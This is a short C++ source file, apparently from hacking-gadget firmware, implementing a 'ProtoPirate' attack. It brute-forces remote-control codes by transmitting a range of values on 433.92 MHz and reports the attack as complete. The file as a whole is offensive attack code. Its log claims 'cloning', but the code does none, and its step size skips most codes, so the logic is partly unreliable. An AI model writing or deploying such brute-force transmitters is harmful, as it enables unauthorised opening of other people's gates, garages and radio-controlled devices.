// protopirate.cpp
#include "protopirate.h"
#include "../hardware/hw_radio.h"
#include "../ui/ui_draw.h"
void protopirate_run(cyd_state_t* state) {
    cyd_draw_attack("ProtoPirate");
    cyd_draw_log("Bruting and cloning signals...");
    for(uint32_t code=0x1000; code<0x2000; code+=9) {
        radio_send_code(433920000, 2, code);
        delay(20);
        cyd_draw_log("Trying codes...");
    }
    cyd_draw_green_light("ProtoPirate attack complete.");
}
